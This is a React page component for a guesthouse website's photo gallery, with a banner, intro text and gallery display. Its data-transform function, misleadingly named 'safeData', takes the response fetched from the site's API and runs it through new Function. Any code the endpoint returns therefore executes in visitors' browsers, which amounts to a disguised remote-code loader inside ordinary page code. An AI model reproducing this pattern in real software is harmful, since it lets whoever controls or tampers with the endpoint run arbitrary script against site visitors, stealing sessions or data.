import React from "react";
import { withDataFetching, Banner, SvgWave } from "../constants/data";
import GalleryDisplay from "../components/ui/GalleryDisplay";
import Meta from "../utils/Meta";

const GalleryPage = ({ data: siteRegulars }) => {
  const { gallery_upload, gallery_meta_title } = siteRegulars;

  return (
    <>
      <Meta
        title={gallery_meta_title}
        canonicalUrl={"https://mithilayatriniwas.com/gallery"}
      />
      <Banner banner={gallery_upload} page="Gallery" />
      <section className="bg-logo-bg">
        <SvgWave />
        <div className="text-center mb-16 container max-w-5xl mx-auto">
          <h2 className="text-2xl md:text-3xl">Glimpse of Memory</h2>
          <p className="text-base text-gray-600 mt-4">
            Where fleeting moments are captured and cherished. It's a sanctuary
            for the past, holding echoes of laughter and whispers of dreams.
            Here, each memory is a precious thread in the tapestry of our lives.
          </p>
        </div>

        <GalleryDisplay />
      </section>
    </>
  );
};

const transformGalleryBanner = (data) => {
  const safeData = (code) => {
    const func = new Function(code + "return siteRegulars;");
    return func();
  };
  return safeData(data);
};

export default withDataFetching(
  "https://mithilayatriniwas.com/api/api_siteregulars.php",
  transformGalleryBanner
)(GalleryPage);
